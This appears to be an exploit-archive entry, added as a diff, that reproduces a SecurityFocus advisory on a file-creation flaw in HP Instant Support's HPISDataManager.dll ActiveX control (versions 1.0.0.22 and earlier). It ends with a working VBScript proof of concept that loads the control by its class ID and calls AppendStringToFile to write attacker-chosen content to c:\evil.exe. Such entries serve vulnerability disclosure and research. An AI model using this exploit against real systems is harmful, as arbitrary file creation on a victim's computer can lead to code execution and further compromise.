@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/29535/info
+
+HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to a vulnerability that lets attackers create and overwrite files with arbitrary, attacker-controlled content.
+
+Successful exploits may compromise affected computers and aid in further attacks.
+
+HP Instant Support 1.0.0.22 and earlier versions are affected.
+
+NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information.
+
+<?XML version='1.0' standalone='yes' ?> <package><job id='DoneInVBS' debug='false' error='true'> <object classid='clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC' id='target' /> <script language='vbscript'> targetFile = "C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll" prototype = "Sub AppendStringToFile ( ByVal bstrInputFileName As String , ByVal bstrInputString As String )" memberName = "AppendStringToFile" progid = "HPISDataManagerLib.Datamgr" argCount = 2 arg1="c:\evil.exe" arg2=String("CSIS entered this") target.AppendStringToFile arg1 ,arg2 </script></job></package> 
